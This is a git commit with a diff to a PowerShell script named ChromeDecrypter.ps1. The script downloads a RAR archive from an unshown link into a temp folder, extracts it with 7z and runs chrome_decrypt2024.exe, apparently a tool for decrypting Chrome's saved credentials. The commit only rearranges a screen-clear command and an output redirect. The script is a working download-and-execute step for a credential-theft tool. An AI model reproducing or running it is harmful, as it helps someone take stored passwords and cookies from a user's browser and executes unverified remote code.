39f33dd4819389cda21d595d5d7386c9e8a08655
Andreas Mouritsen <77634312+Andreas6920@users.noreply.github.com>
2024-05-28 01:31:14 +0200

    Update ChromeDecrypter.ps1

--- scripts/ChromeDecrypter.ps1
+++ scripts/ChromeDecrypter.ps1
@@ -2,17 +2,17 @@
 $File = Join-Path -Path "$Env:TMP\chromedump" -ChildPath "chrome-decrypter-master.rar"
 $Folder = Split-path $file -Parent; if(test-path $folder){rmdir $Folder -Recurse -Force | Out-Null}
 mkdir $Folder
-CLS
 
 Set-Location $folder
 Write-host "`t- Downloading"
 Invoke-RestMethod -Uri $Link -OutFile $File 
 
 Write-host "`t- Extracting"
-7z e $File -spf | Out-Null
+7z e $File -spf
 
 Start-Sleep -S 5
 Write-host "`t- Running.."
+CLS
 &.\chrome_decrypt2024.exe
 
 write-host "Credits to: SabinFotograf"
